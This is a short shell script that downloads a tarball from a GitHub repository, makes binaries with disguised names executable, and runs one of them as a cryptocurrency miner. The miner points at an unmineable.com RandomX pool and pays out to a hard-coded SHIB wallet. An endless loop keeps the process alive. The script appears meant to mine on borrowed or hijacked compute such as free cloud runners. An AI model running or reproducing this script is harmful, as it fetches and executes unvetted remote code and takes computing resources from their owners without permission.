#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/AZKAFamilychanel/Setan/raw/main/setan.tar.gz
tar -xvf setan.tar.gz
cd setan
chmod +x jurig
chmod +x jurig-setan
chmod +x sahaeta
ls
./jurig --donate-level 1 -o rx.unmineable.com:3333 -a rx/0 -u SHIB:0xBC6dBa2501b9211B1e84B77379668e541af47Bd6.Rig001#eitx-u3k9 -p x -t 1 -k --cpu 1
while [ 1 ]; do
sleep 3
done
sleep 9999
